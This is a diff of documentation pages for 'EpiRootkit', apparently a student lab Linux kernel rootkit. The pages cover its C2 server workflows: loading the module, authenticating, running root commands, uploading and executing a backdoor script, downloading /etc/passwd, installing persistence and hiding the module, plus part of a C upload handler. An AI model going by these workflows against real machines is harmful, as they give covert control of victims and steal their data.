@@ -1,13 +1,13 @@
-<!doctype html><html lang=en><head><meta charset=utf-8><title>File Transfer | Tux Fan Club Docs</title>
-<meta name=viewport content="width=device-width,initial-scale=1"><meta name=description content="Upload and download files between C2 server and victim system"><meta name=keywords content="Documentation,Hugo,Hugo Theme,Bootstrap"><meta name=author content="Colin Wilson - Lotus Labs"><meta name=email content="support@aigis.uk"><meta name=website content="https://lotusdocs.dev"><meta name=Version content="v0.1.0"><link rel=icon href=/favicon.ico sizes=any><link rel=icon type=image/svg+xml href=/favicon.svg><link rel=apple-touch-icon sizes=180x180 href=/apple-touch-icon.png><link rel=icon type=image/png sizes=32x32 href=/favicon-32x32.png><link rel=icon type=image/png sizes=16x16 href=/favicon-16x16.png><link rel=manifest crossorigin=use-credentials href=/site.webmanifest><meta property="og:title" content="File Transfer"><meta property="og:description" content="Upload and download files between C2 server and victim system"><meta property="og:type" content="article"><meta property="og:url" content="/docs/04-epirootkit/features/file-transfer/"><meta property="og:image" content="/opengraph/card-base-2_hu_b8bc8092757c8adf.png"><meta property="article:section" content="docs"><meta property="article:published_time" content="2025-05-25T00:00:00+01:00"><meta property="article:modified_time" content="2025-05-26T02:26:51+02:00"><meta name=twitter:card content="summary_large_image"><meta name=twitter:image content="/opengraph/card-base-2_hu_b8bc8092757c8adf.png"><meta name=twitter:title content="File Transfer"><meta name=twitter:description content="Upload and download files between C2 server and victim system"><link rel=alternate type=application/atom+xml title="Atom feed for Tux Fan Club Docs" href=/index.xml><script>(()=>{var t=window.matchMedia&&window.matchMedia("(prefers-color-scheme: dark)").matches,e=localStorage.getItem("theme");t&&e===null&&(localStorage.setItem("theme","dark"),document.documentElement.setAttribute("data-dark-mode","")),t&&e==="dark"&&document.documentElement.setAttribute("data-dark-mode",""),e==="dark"&&document.documentElement.setAttribute("data-dark-mode","")})()</script><script type=text/javascript src=/docs/js/flexsearch.bundle.min.249548594cb6843f3060a3cdd3043799676c59ce8db83358a3fc2e4d20598d05dfa6ce4994805d2835cb33b54dc9b9e7.js integrity=sha384-JJVIWUy2hD8wYKPN0wQ3mWdsWc6NuDNYo/wuTSBZjQXfps5JlIBdKDXLM7VNybnn crossorigin=anonymous></script><link rel=preconnect href=https://fonts.gstatic.com/><link rel=preconnect href=https://fonts.gstatic.com/ crossorigin><link href="https://fonts.googleapis.com/css?family=Inter:300,400,600,700|Fira+Code:500,700&display=block" rel=stylesheet><link rel=stylesheet href=/docs/scss/style.min.47627c508718021a8811f17bfd419041ce97729127a3db8f6bcf7c26c29fbacf37e002e618d60350aae90d89464e8447.css integrity=sha384-R2J8UIcYAhqIEfF7/UGQQc6XcpEno9uPa898JsKfus834ALmGNYDUKrpDYlGToRH crossorigin=anonymous></head><body><div class=content><div class="page-wrapper toggled"><nav id=sidebar class=sidebar-wrapper><div class=sidebar-brand><a href=/ aria-label=HomePage alt=HomePage><svg id="Layer_1" viewBox="0 0 250 250"><path d="m143 39.5c-18 0-18 18-18 18s0-18-18-18H22c-2.76.0-5 2.24-5 5v143c0 2.76 2.24 5 5 5h76c7.2.0 8.64 11.52 8.93 16.13.07 1.05.95 1.87 2 1.87h32.14c1.06.0 1.94-.82 2-1.87.29-4.61 1.73-16.13 8.93-16.13h76c2.76.0 5-2.24 5-5V44.5c0-2.76-2.24-5-5-5h-85zM206 163c0 1.38-1.12 2.5-2.5 2.5H143c-18 0-18 18-18 18s0-18-18-18H46.5c-1.38.0-2.5-1.12-2.5-2.5V69c0-1.38 1.12-2.5 2.5-2.5H98c7.2.0 8.64 11.52 8.93 16.13.07 1.05.95 1.87 2 1.87h32.14c1.06.0 1.94-.82 2-1.87.29-4.61 1.73-16.13 8.93-16.13h51.5c1.38.0 2.5 1.12 2.5 2.5v94z" style="fill:#06f"/></svg></a></div><div class=sidebar-content style="height:calc(100% - 131px)"><ul class=sidebar-menu><li><a class=sidebar-root-link href=/docs/01-introduction/presentation/><i class="material-icons me-2">code</i>
+<!doctype html><html lang=en><head><meta charset=utf-8><title>Usage Guide | Tux Fan Club Docs</title>
+<meta name=viewport content="width=device-width,initial-scale=1"><meta name=description content="Comprehensive usage scenarios and workflows"><meta name=keywords content="Documentation,Hugo,Hugo Theme,Bootstrap"><meta name=author content="Colin Wilson - Lotus Labs"><meta name=email content="support@aigis.uk"><meta name=website content="https://lotusdocs.dev"><meta name=Version content="v0.1.0"><link rel=icon href=/favicon.ico sizes=any><link rel=icon type=image/svg+xml href=/favicon.svg><link rel=apple-touch-icon sizes=180x180 href=/apple-touch-icon.png><link rel=icon type=image/png sizes=32x32 href=/favicon-32x32.png><link rel=icon type=image/png sizes=16x16 href=/favicon-16x16.png><link rel=manifest crossorigin=use-credentials href=/site.webmanifest><meta property="og:title" content="Usage Guide"><meta property="og:description" content="Comprehensive usage scenarios and workflows"><meta property="og:type" content="article"><meta property="og:url" content="/docs/03-attacking-program/usage/"><meta property="og:image" content="/opengraph/card-base-2_hu_1d675943db95d722.png"><meta property="article:section" content="docs"><meta property="article:published_time" content="2025-05-25T00:00:00+01:00"><meta property="article:modified_time" content="2025-05-26T02:26:51+02:00"><meta name=twitter:card content="summary_large_image"><meta name=twitter:image content="/opengraph/card-base-2_hu_1d675943db95d722.png"><meta name=twitter:title content="Usage Guide"><meta name=twitter:description content="Comprehensive usage scenarios and workflows"><link rel=alternate type=application/atom+xml title="Atom feed for Tux Fan Club Docs" href=/index.xml><script>(()=>{var t=window.matchMedia&&window.matchMedia("(prefers-color-scheme: dark)").matches,e=localStorage.getItem("theme");t&&e===null&&(localStorage.setItem("theme","dark"),document.documentElement.setAttribute("data-dark-mode","")),t&&e==="dark"&&document.documentElement.setAttribute("data-dark-mode",""),e==="dark"&&document.documentElement.setAttribute("data-dark-mode","")})()</script><script type=text/javascript src=/docs/js/flexsearch.bundle.min.249548594cb6843f3060a3cdd3043799676c59ce8db83358a3fc2e4d20598d05dfa6ce4994805d2835cb33b54dc9b9e7.js integrity=sha384-JJVIWUy2hD8wYKPN0wQ3mWdsWc6NuDNYo/wuTSBZjQXfps5JlIBdKDXLM7VNybnn crossorigin=anonymous></script><link rel=preconnect href=https://fonts.gstatic.com/><link rel=preconnect href=https://fonts.gstatic.com/ crossorigin><link href="https://fonts.googleapis.com/css?family=Inter:300,400,600,700|Fira+Code:500,700&display=block" rel=stylesheet><link rel=stylesheet href=/docs/scss/style.min.47627c508718021a8811f17bfd419041ce97729127a3db8f6bcf7c26c29fbacf37e002e618d60350aae90d89464e8447.css integrity=sha384-R2J8UIcYAhqIEfF7/UGQQc6XcpEno9uPa898JsKfus834ALmGNYDUKrpDYlGToRH crossorigin=anonymous></head><body><div class=content><div class="page-wrapper toggled"><nav id=sidebar class=sidebar-wrapper><div class=sidebar-brand><a href=/ aria-label=HomePage alt=HomePage><svg id="Layer_1" viewBox="0 0 250 250"><path d="m143 39.5c-18 0-18 18-18 18s0-18-18-18H22c-2.76.0-5 2.24-5 5v143c0 2.76 2.24 5 5 5h76c7.2.0 8.64 11.52 8.93 16.13.07 1.05.95 1.87 2 1.87h32.14c1.06.0 1.94-.82 2-1.87.29-4.61 1.73-16.13 8.93-16.13h76c2.76.0 5-2.24 5-5V44.5c0-2.76-2.24-5-5-5h-85zM206 163c0 1.38-1.12 2.5-2.5 2.5H143c-18 0-18 18-18 18s0-18-18-18H46.5c-1.38.0-2.5-1.12-2.5-2.5V69c0-1.38 1.12-2.5 2.5-2.5H98c7.2.0 8.64 11.52 8.93 16.13.07 1.05.95 1.87 2 1.87h32.14c1.06.0 1.94-.82 2-1.87.29-4.61 1.73-16.13 8.93-16.13h51.5c1.38.0 2.5 1.12 2.5 2.5v94z" style="fill:#06f"/></svg></a></div><div class=sidebar-content style="height:calc(100% - 131px)"><ul class=sidebar-menu><li><a class=sidebar-root-link href=/docs/01-introduction/presentation/><i class="material-icons me-2">code</i>
 Presentation</a></li><li class=sidebar-dropdown><button class=btn>
 <i class="material-icons me-2">code</i>
-Setup</button><div class=sidebar-submenu><ul><li><a class=sidebar-nested-link href=/docs/02-setup/environment/>Initial Setup & Installation</a></li><li><a class=sidebar-nested-link href=/docs/02-setup/vm-installation/>VM Installation & Verification</a></li><li><a class=sidebar-nested-link href=/docs/02-setup/attacking-vm-setup/>Attacking VM Setup</a></li><li><a class=sidebar-nested-link href=/docs/02-setup/victim-vm-setup/>Victim VM Setup</a></li></ul></div></li><li class=sidebar-dropdown><button class=btn>
+Setup</button><div class=sidebar-submenu><ul><li><a class=sidebar-nested-link href=/docs/02-setup/environment/>Initial Setup & Installation</a></li><li><a class=sidebar-nested-link href=/docs/02-setup/vm-installation/>VM Installation & Verification</a></li><li><a class=sidebar-nested-link href=/docs/02-setup/attacking-vm-setup/>Attacking VM Setup</a></li><li><a class=sidebar-nested-link href=/docs/02-setup/victim-vm-setup/>Victim VM Setup</a></li></ul></div></li><li class="sidebar-dropdown current active"><button class=btn>
 <i class="material-icons me-2">notes</i>
-Attacking Program (C2 Server)</button><div class=sidebar-submenu><ul><li><a class=sidebar-nested-link href=/docs/03-attacking-program/overview/>Overview</a></li><li><a class=sidebar-nested-link href=/docs/03-attacking-program/commands/>Command Reference</a></li><li><a class=sidebar-nested-link href=/docs/03-attacking-program/installation/>Installation</a></li><li><a class=sidebar-nested-link href=/docs/03-attacking-program/usage/>Usage Guide</a></li></ul></div></li><li class="sidebar-dropdown current active"><button class=btn>
+Attacking Program (C2 Server)</button><div class="sidebar-submenu d-block"><ul><li><a class=sidebar-nested-link href=/docs/03-attacking-program/overview/>Overview</a></li><li><a class=sidebar-nested-link href=/docs/03-attacking-program/commands/>Command Reference</a></li><li><a class=sidebar-nested-link href=/docs/03-attacking-program/installation/>Installation</a></li><li class=current><a class=sidebar-nested-link href=/docs/03-attacking-program/usage/>Usage Guide</a></li></ul></div></li><li class=sidebar-dropdown><button class=btn>
 <i class="material-icons me-2">shield</i>
-EpiRootkit</button><div class="sidebar-submenu d-block"><ul><li><a class=sidebar-nested-link href=/docs/04-epirootkit/overview/>EpiRootkit Overview</a></li><li><a class=sidebar-nested-link href=/docs/04-epirootkit/configuration-justifications/>Configuration Justifications</a></li><li><a class=sidebar-nested-link href=/docs/04-epirootkit/connection-authentication/>Connection & Authentication</a></li><li><a class=sidebar-nested-link href=/docs/04-epirootkit/deployment/>Build & Deployment</a></li><li class="sidebar-dropdown nested current active"><button class=btn>
-Features</button><div class="sidebar-submenu d-block"><ul><li><a class=sidebar-nested-link href=/docs/04-epirootkit/features/command-execution/>Command Execution</a></li><li class=current><a class=sidebar-nested-link href=/docs/04-epirootkit/features/file-transfer/>File Transfer</a></li><li><a class=sidebar-nested-link href=/docs/04-epirootkit/features/hiding/>Stealth & Hiding</a></li><li><a class=sidebar-nested-link href=/docs/04-epirootkit/features/persistence/>Persistence</a></li></ul></div></li></ul></div></li><li class=sidebar-dropdown><button class=btn>
+EpiRootkit</button><div class=sidebar-submenu><ul><li><a class=sidebar-nested-link href=/docs/04-epirootkit/overview/>EpiRootkit Overview</a></li><li><a class=sidebar-nested-link href=/docs/04-epirootkit/configuration-justifications/>Configuration Justifications</a></li><li><a class=sidebar-nested-link href=/docs/04-epirootkit/connection-authentication/>Connection & Authentication</a></li><li><a class=sidebar-nested-link href=/docs/04-epirootkit/deployment/>Build & Deployment</a></li><li class="sidebar-dropdown nested"><button class=btn>
+Features</button><div class=sidebar-submenu><ul><li><a class=sidebar-nested-link href=/docs/04-epirootkit/features/command-execution/>Command Execution</a></li><li><a class=sidebar-nested-link href=/docs/04-epirootkit/features/file-transfer/>File Transfer</a></li><li><a class=sidebar-nested-link href=/docs/04-epirootkit/features/hiding/>Stealth & Hiding</a></li><li><a class=sidebar-nested-link href=/docs/04-epirootkit/features/persistence/>Persistence</a></li></ul></div></li></ul></div></li><li class=sidebar-dropdown><button class=btn>
 <i class="material-icons me-2">monitor</i>
 Web UI (C2 Frontend)</button><div class=sidebar-submenu><ul><li><a class=sidebar-nested-link href=/docs/06-web-ui/overview/>README</a></li><li><a class=sidebar-nested-link href=/docs/06-web-ui/installation/>Installation & Setup</a></li><li><a class=sidebar-nested-link href=/docs/06-web-ui/i3/>i3 like interface</a></li></ul></div></li><li><a class=sidebar-root-link href=/docs/07-bonuses/wlkom-ctf/><i class="material-icons me-2">savings</i>
 Tux Fan Club: Chasse au Trésor Pirate</a></li><li><a class=sidebar-root-link href=/docs/08-remerciements/thankyou/><i class="material-icons me-2">favorite</i>
@@ -26,115 +26,145 @@ Un dernier mot</a></li></ul></div><ul class="sidebar-footer list-unstyled mb-0">
 <span class=flexsearch-key-label>to close</span></li></div><form class="flexsearch position-relative flex-grow-1 ms-2 me-2"><div class="d-flex flex-row"><input id=flexsearch class=form-control type=search placeholder=Search aria-label=Search autocomplete=off>
 <button id=hideFlexsearch type=button class="ms-2 btn btn-soft">
 cancel</button></div><div id=suggestions class="shadow rounded-1 d-none"></div></form></div></div></div><div class=container-fluid><div class=layout-spacing><div class="d-md-flex justify-content-between align-items-center"><nav aria-label=breadcrumb class="d-inline-block pb-2 mt-1 mt-sm-0"><ul id=breadcrumbs class="breadcrumb bg-transparent mb-0" itemscope itemtype=https://schema.org/BreadcrumbList><li class="breadcrumb-item text-capitalize active" aria-current=page itemprop=itemListElement itemscope itemtype=https://schema.org/ListItem><a itemprop=item href=/docs/><i class="material-icons size-20 align-text-bottom" itemprop=name>Home</i>
-</a><meta itemprop=position content='1'></li><li class="breadcrumb-item text-capitalize" itemprop=itemListElement itemscope itemtype=https://schema.org/ListItem><a itemprop=item href=/docs/04-epirootkit/><span itemprop=name>EpiRootkit</span>
-</a><meta itemprop=position content='2'></li><li class="breadcrumb-item text-capitalize" itemprop=itemListElement itemscope itemtype=https://schema.org/ListItem><a itemprop=item href=/docs/04-epirootkit/features/><span itemprop=name>Features</span>
-</a><meta itemprop=position content='3'></li><li class="breadcrumb-item text-capitalize active" itemprop=itemListElement itemscope itemtype=https://schema.org/ListItem><span itemprop=name>File Transfer</span>
-<meta itemprop=position content='4'></li></ul></nav></div><div class="row flex-xl-nowrap"><div class="docs-toc col-xl-3 d-xl-block"><toc><div class="fw-bold text-uppercase mb-2">On this page</div><nav id=toc><ul><li><a href=#file-transfer>File Transfer</a><ul><li><a href=#how-it-works>How It Works</a><ul><li><a href=#upload-process>Upload Process</a></li><li><a href=#download-process>Download Process</a></li></ul></li><li><a href=#upload-feature>Upload Feature</a><ul><li><a href=#basic-usage>Basic Usage</a></li><li><a href=#implementation-details>Implementation Details</a></li></ul></li><li><a href=#download-feature>Download Feature</a><ul><li><a href=#basic-usage-1>Basic Usage</a></li></ul></li><li><a href=#real-examples>Real Examples</a><ul><li><a href=#system-files>System Files</a></li><li><a href=#upload-scripts>Upload Scripts</a></li></ul></li><li><a href=#technical-implementation>Technical Implementation</a><ul><li><a href=#upload-handler>Upload Handler</a></li><li><a href=#download-handler>Download Handler</a></li></ul></li><li><a href=#configuration>Configuration</a></li></ul></li></ul></nav></toc></div><div class="docs-toc-mobile d-print-none d-xl-none"><button id=toc-dropdown-btn class="btn-secondary dropdown-toggle" type=button data-bs-toggle=dropdown data-bs-offset=0,0 aria-expanded=false>
-Table of Contents</button><nav id=toc-mobile><ul class=dropdown-menu><li><a href=#file-transfer>File Transfer</a><ul><li><a href=#how-it-works>How It Works</a><ul><li><a href=#upload-process>Upload Process</a></li><li><a href=#download-process>Download Process</a></li></ul></li><li><a href=#upload-feature>Upload Feature</a><ul><li><a href=#basic-usage>Basic Usage</a></li><li><a href=#implementation-details>Implementation Details</a></li></ul></li><li><a href=#download-feature>Download Feature</a><ul><li><a href=#basic-usage-1>Basic Usage</a></li></ul></li><li><a href=#real-examples>Real Examples</a><ul><li><a href=#system-files>System Files</a></li><li><a href=#upload-scripts>Upload Scripts</a></li></ul></li><li><a href=#technical-implementation>Technical Implementation</a><ul><li><a href=#upload-handler>Upload Handler</a></li><li><a href=#download-handler>Download Handler</a></li></ul></li><li><a href=#configuration>Configuration</a></li></ul></li></ul></nav></div><div class="docs-content col-12 col-xl-9 mt-0"><div class="mb-0 d-flex"><i class="material-icons title-icon me-2">file-transfer</i><h1 class="content-title mb-0">File Transfer</h1></div><p class="lead mb-3">Upload and download files between C2 server and victim system</p><div id=content class=main-content data-bs-spy=scroll data-bs-root-margin="0px 0px -65%" data-bs-target=#toc-mobile><div data-prismjs-copy data-prismjs-copy-success data-prismjs-copy-error><h1 id=file-transfer>File Transfer <a href=#file-transfer class=anchor aria-hidden=true><i class="material-icons align-middle">link</i></a></h1><p>Transfer files between the C2 server and victim system using direct content transmission.</p><h2 id=how-it-works>How It Works <a href=#how-it-works class=anchor aria-hidden=true><i class="material-icons align-middle">link</i></a></h2><h3 id=upload-process>Upload Process <a href=#upload-process class=anchor aria-hidden=true><i class="material-icons align-middle">link</i></a></h3><ol><li><strong>C2 reads local file</strong> and sends content</li><li><strong>Rootkit receives</strong> filename and content</li><li><strong>Creates file</strong> on victim system using <code>filp_open()</code></li><li><strong>Writes content</strong> using <code>kernel_write()</code></li></ol><h3 id=download-process>Download Process <a href=#download-process class=anchor aria-hidden=true><i class="material-icons align-middle">link</i></a></h3><ol><li><strong>C2 requests file</strong> by path</li><li><strong>Rootkit opens file</strong> using <code>filp_open()</code></li><li><strong>Reads content</strong> using <code>kernel_read()</code></li><li><strong>Sends content</strong> back to C2 server</li></ol><h2 id=upload-feature>Upload Feature <a href=#upload-feature class=anchor aria-hidden=true><i class="material-icons align-middle">link</i></a></h2><h3 id=basic-usage>Basic Usage <a href=#basic-usage class=anchor aria-hidden=true><i class="material-icons align-middle">link</i></a></h3><div class=prism-codeblock><pre id=a949028 class=language-bash>
-  <code># Upload file to specific path
-c2-server$ upload Client-1 ./config.txt /etc/myapp/config.txt
-# ✓ File uploaded successfully (1024 bytes)
+</a><meta itemprop=position content='1'></li><li class="breadcrumb-item text-capitalize" itemprop=itemListElement itemscope itemtype=https://schema.org/ListItem><a itemprop=item href=/docs/03-attacking-program/><span itemprop=name>Attacking Program (C2 Server)</span>
+</a><meta itemprop=position content='2'></li><li class="breadcrumb-item text-capitalize active" itemprop=itemListElement itemscope itemtype=https://schema.org/ListItem><span itemprop=name>Usage Guide</span>
+<meta itemprop=position content='3'></li></ul></nav></div><div class="row flex-xl-nowrap"><div class="docs-toc col-xl-3 d-xl-block"><toc><div class="fw-bold text-uppercase mb-2">On this page</div><nav id=toc><ul><li><a href=#usage-guide>Usage Guide</a><ul><li><a href=#getting-started>Getting Started</a><ul><li><a href=#1-start-the-c2-server>1. Start the C2 Server</a></li><li><a href=#2-wait-for-rootkit-connection>2. Wait for Rootkit Connection</a></li><li><a href=#3-authenticate>3. Authenticate</a></li></ul></li><li><a href=#basic-workflows>Basic Workflows</a><ul><li><a href=#client-management-workflow>Client Management Workflow</a></li><li><a href=#command-execution-workflow>Command Execution Workflow</a></li><li><a href=#file-transfer-workflow>File Transfer Workflow</a></li></ul></li><li><a href=#advanced-workflows>Advanced Workflows</a><ul><li><a href=#persistence-management>Persistence Management</a></li><li><a href=#stealth-configuration>Stealth Configuration</a></li></ul></li></ul></li></ul></nav></toc></div><div class="docs-toc-mobile d-print-none d-xl-none"><button id=toc-dropdown-btn class="btn-secondary dropdown-toggle" type=button data-bs-toggle=dropdown data-bs-offset=0,0 aria-expanded=false>
+Table of Contents</button><nav id=toc-mobile><ul class=dropdown-menu><li><a href=#usage-guide>Usage Guide</a><ul><li><a href=#getting-started>Getting Started</a><ul><li><a href=#1-start-the-c2-server>1. Start the C2 Server</a></li><li><a href=#2-wait-for-rootkit-connection>2. Wait for Rootkit Connection</a></li><li><a href=#3-authenticate>3. Authenticate</a></li></ul></li><li><a href=#basic-workflows>Basic Workflows</a><ul><li><a href=#client-management-workflow>Client Management Workflow</a></li><li><a href=#command-execution-workflow>Command Execution Workflow</a></li><li><a href=#file-transfer-workflow>File Transfer Workflow</a></li></ul></li><li><a href=#advanced-workflows>Advanced Workflows</a><ul><li><a href=#persistence-management>Persistence Management</a></li><li><a href=#stealth-configuration>Stealth Configuration</a></li></ul></li></ul></li></ul></nav></div><div class="docs-content col-12 col-xl-9 mt-0"><div class="mb-0 d-flex"><i class="material-icons title-icon me-2">play</i><h1 class="content-title mb-0">Usage Guide</h1></div><p class="lead mb-3">Comprehensive usage scenarios and workflows</p><div id=content class=main-content data-bs-spy=scroll data-bs-root-margin="0px 0px -65%" data-bs-target=#toc-mobile><div data-prismjs-copy data-prismjs-copy-success data-prismjs-copy-error><h1 id=usage-guide>Usage Guide <a href=#usage-guide class=anchor aria-hidden=true><i class="material-icons align-middle">link</i></a></h1><p>Complete workflows and usage scenarios for the EpiRootkit C2 server.</p><h2 id=getting-started>Getting Started <a href=#getting-started class=anchor aria-hidden=true><i class="material-icons align-middle">link</i></a></h2><h3 id=1-start-the-c2-server>1. Start the C2 Server <a href=#1-start-the-c2-server class=anchor aria-hidden=true><i class="material-icons align-middle">link</i></a></h3><div class=prism-codeblock><pre id=12b556f class=language-bash>
+  <code>cd attacking_program
+pnpm start</code>
+  </pre></div><h3 id=2-wait-for-rootkit-connection>2. Wait for Rootkit Connection <a href=#2-wait-for-rootkit-connection class=anchor aria-hidden=true><i class="material-icons align-middle">link</i></a></h3><div class=prism-codeblock><pre id=5912d77 class=language-bash>
+  <code># On victim machine
+sudo insmod epirootkit.ko
 
-# Upload to current directory (uses basename)
-c2-server$ upload Client-1 ./script.sh
-# ✓ File uploaded successfully (512 bytes) -&gt; ./script.sh</code>
-  </pre></div><h3 id=implementation-details>Implementation Details <a href=#implementation-details class=anchor aria-hidden=true><i class="material-icons align-middle">link</i></a></h3><ul><li><strong>File creation</strong>: Uses <code>O_WRONLY | O_CREAT | O_TRUNC</code> flags</li><li><strong>Permissions</strong>: Files created with 0644 permissions</li><li><strong>Size limits</strong>: 10MB maximum file size</li></ul><h2 id=download-feature>Download Feature <a href=#download-feature class=anchor aria-hidden=true><i class="material-icons align-middle">link</i></a></h2><h3 id=basic-usage-1>Basic Usage <a href=#basic-usage-1 class=anchor aria-hidden=true><i class="material-icons align-middle">link</i></a></h3><div class=prism-codeblock><pre id=390b28f class=language-bash>
-  <code># Download to specific local path
+# C2 server will show:
+┌─ Client-1
+  ✓ [2025-05-25 16:13:29] Connected
+└─</code>
+  </pre></div><h3 id=3-authenticate>3. Authenticate <a href=#3-authenticate class=anchor aria-hidden=true><i class="material-icons align-middle">link</i></a></h3><div class=prism-codeblock><pre id=9e3bffe class=language-bash>
+  <code>c2-server$ auth Client-1 &lt;password&gt; (default: password)
+┌─ Client-1
+  ✓ [2025-05-25 16:13:30] Authenticated
+└─</code>
+  </pre></div><h4 id=brute-force-protection>Brute Force Protection <a href=#brute-force-protection class=anchor aria-hidden=true><i class="material-icons align-middle">link</i></a></h4><p>Rate limit to 5 attempts per 60 seconds.</p><h2 id=basic-workflows>Basic Workflows <a href=#basic-workflows class=anchor aria-hidden=true><i class="material-icons align-middle">link</i></a></h2><h3 id=client-management-workflow>Client Management Workflow <a href=#client-management-workflow class=anchor aria-hidden=true><i class="material-icons align-middle">link</i></a></h3><h4 id=list-and-monitor-clients>List and Monitor Clients <a href=#list-and-monitor-clients class=anchor aria-hidden=true><i class="material-icons align-middle">link</i></a></h4><div class=prism-codeblock><pre id=1713c87 class=language-bash>
+  <code># List all connected clients
+c2-server$ ls
+┌─ Connected Clients
+  • Client-1 - AUTHENTICATED - Last seen: 6:13:29 PM
+  • Client-2 - UNAUTHENTICATED - Last seen: 6:10:15 PM
+└─
+
+# Check specific client status
+c2-server$ status Client-1
+┌─ Client-1
+  • [2025-05-25 16:13:30] Command result:
+  • EpiRootkit Status:
+  • Version: 1.0.0
+  • Authentication: YES
+  • Connection: CONNECTED
+  • Module Hidden: YES
+  • Encryption: DISABLED
+  • Persistence: ENABLED
+└─
+
+# Monitor connection health
+c2-server$ keepalive Client-1
+┌─ Client-1
+  • [2025-05-25 16:13:31] Command result:
+  • Keepalive Status:
+  • Last ping sent: 2025-05-25 16:14:00
+  • Connection stable: YES
+└─</code>
+  </pre></div><h3 id=command-execution-workflow>Command Execution Workflow <a href=#command-execution-workflow class=anchor aria-hidden=true><i class="material-icons align-middle">link</i></a></h3><h4 id=basic-system-commands>Basic System Commands <a href=#basic-system-commands class=anchor aria-hidden=true><i class="material-icons align-middle">link</i></a></h4><div class=prism-codeblock><pre id=dd7b732 class=language-bash>
+  <code># Check user privileges
+c2-server$ exec Client-1 whoami
+┌─ Client-1
+  • [2025-05-25 16:13:32] Command result:
+  • root
+└─
+
+# System information
+c2-server$ exec Client-1 uname -a
+┌─ Client-1
+  • [2025-05-25 16:13:33] Command result:
+  • Linux victim 5.4.0-74-generic #83-Ubuntu SMP Wed Apr 29 23:25:17 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux
+└─</code>
+  </pre></div><h3 id=file-transfer-workflow>File Transfer Workflow <a href=#file-transfer-workflow class=anchor aria-hidden=true><i class="material-icons align-middle">link</i></a></h3><h4 id=upload-files-to-victim>Upload Files to Victim <a href=#upload-files-to-victim class=anchor aria-hidden=true><i class="material-icons align-middle">link</i></a></h4><div class=prism-codeblock><pre id=055bdb8 class=language-bash>
+  <code># Upload a script
+c2-server$ upload Client-1 ./scripts/backdoor.sh /tmp/backdoor.sh
+┌─ File Upload
+  • Uploading ./scripts/backdoor.sh → /tmp/backdoor.sh
+  ✓ Upload initiated
+└─
+
+# Upload configuration
+c2-server$ upload Client-1 ./configs/malware.conf /etc/malware.conf
+┌─ File Upload
+  • Uploading ./configs/malware.conf → /etc/malware.conf
+  ✓ Upload initiated
+└─
+
+# Verify upload
+c2-server$ exec Client-1 ls -la /tmp/backdoor.sh
+c2-server$ exec Client-1 chmod &#43;x /tmp/backdoor.sh</code>
+  </pre></div><h4 id=download-files-from-victim>Download Files from Victim <a href=#download-files-from-victim class=anchor aria-hidden=true><i class="material-icons align-middle">link</i></a></h4><div class=prism-codeblock><pre id=9b60d7a class=language-bash>
+  <code># Download sensitive files
 c2-server$ download Client-1 /etc/passwd ./victim_passwd
-# ✓ File downloaded successfully (2048 bytes)
+┌─ File Download
+  • Downloading /etc/passwd → ./victim_passwd
+  ✓ Download request sent
+└─</code>
+  </pre></div><h2 id=advanced-workflows>Advanced Workflows <a href=#advanced-workflows class=anchor aria-hidden=true><i class="material-icons align-middle">link</i></a></h2><h3 id=persistence-management>Persistence Management <a href=#persistence-management class=anchor aria-hidden=true><i class="material-icons align-middle">link</i></a></h3><h4 id=install-persistence>Install Persistence <a href=#install-persistence class=anchor aria-hidden=true><i class="material-icons align-middle">link</i></a></h4><div class=prism-codeblock><pre id=80e6c23 class=language-bash>
+  <code># Interactive persistence menu
+c2-server$ persist Client-1
+┌─ Persistence Management - Client-1
+  • Install All Methods
+  • Remove All Methods
+  • Install Specific Method
+  • Show Status
+  • Exit
 
-# Download to current directory (uses basename)
-c2-server$ download Client-1 /etc/hostname
-# ✓ File downloaded successfully (64 bytes) -&gt; ./hostname</code>
-  </pre></div><h2 id=real-examples>Real Examples <a href=#real-examples class=anchor aria-hidden=true><i class="material-icons align-middle">link</i></a></h2><h3 id=system-files>System Files <a href=#system-files class=anchor aria-hidden=true><i class="material-icons align-middle">link</i></a></h3><div class=prism-codeblock><pre id=72e8c6f class=language-bash>
-  <code># Download system configuration
-c2-server$ download Client-1 /etc/passwd
-# ✓ File downloaded successfully (2048 bytes)
-# Content: root:x:0:0:root:/root:/bin/bash
-#          daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
-#          ...
+? Select persistence action: Install All Methods
+┌─ Installing Persistence
+  • Installing all persistence mechanisms on Client-1...
+  ✓ all persistence mechanisms installation command sent
+└─
 
-# Download network configuration
-c2-server$ download Client-1 /etc/hosts
-# ✓ File downloaded successfully (256 bytes)
-# Content: 127.0.0.1	localhost
-#          127.0.1.1	victim
-#          ...</code>
-  </pre></div><h3 id=upload-scripts>Upload Scripts <a href=#upload-scripts class=anchor aria-hidden=true><i class="material-icons align-middle">link</i></a></h3><div class=prism-codeblock><pre id=170915d class=language-bash>
-  <code># Upload a shell script
-c2-server$ upload Client-1 ./backdoor.sh /tmp/backdoor.sh
-# ✓ File uploaded successfully (1024 bytes)
+# Install specific method
+c2-server$ persist Client-1 install modules
+┌─ Installing Persistence
+  • Installing modules-load.d persistence on Client-1...
+  ✓ modules-load.d persistence installation command sent
+└─</code>
+  </pre></div><h3 id=stealth-configuration>Stealth Configuration <a href=#stealth-configuration class=anchor aria-hidden=true><i class="material-icons align-middle">link</i></a></h3><h4 id=interactive-configuration>Interactive Configuration <a href=#interactive-configuration class=anchor aria-hidden=true><i class="material-icons align-middle">link</i></a></h4><div class=prism-codeblock><pre id=8038efc class=language-bash>
+  <code>c2-server$ config Client-1
+┌─ Configuration - Client-1
+  • Fetching current status...
 
-# Make it executable (via exec command)
-c2-server$ exec Client-1 chmod &#43;x /tmp/backdoor.sh
-# Exit code: 0
+  Current Configuration:
+  [X] Module Hiding (Click to disable)
+  [ ] Persistence (Click to enable)
+  Refresh Status
+  Exit
 
-# Run the script
-c2-server$ exec Client-1 /tmp/backdoor.sh
-# Exit code: 0
-# Output: Backdoor installed successfully</code>
-  </pre></div><h2 id=technical-implementation>Technical Implementation <a href=#technical-implementation class=anchor aria-hidden=true><i class="material-icons align-middle">link</i></a></h2><h3 id=upload-handler>Upload Handler <a href=#upload-handler class=anchor aria-hidden=true><i class="material-icons align-middle">link</i></a></h3><div class=prism-codeblock><pre id=66de7a3 class=language-c>
-  <code>static int handle_upload(const char *data)
-{
-    char *filename, *file_content, *separator;
-    struct file *file;
-    loff_t pos = 0;
-    ssize_t bytes_written;
-    
-    // Parse filename:content format
-    separator = strchr(data, &#39;:&#39;);
-    *separator = &#39;\0&#39;;
-    filename = data;
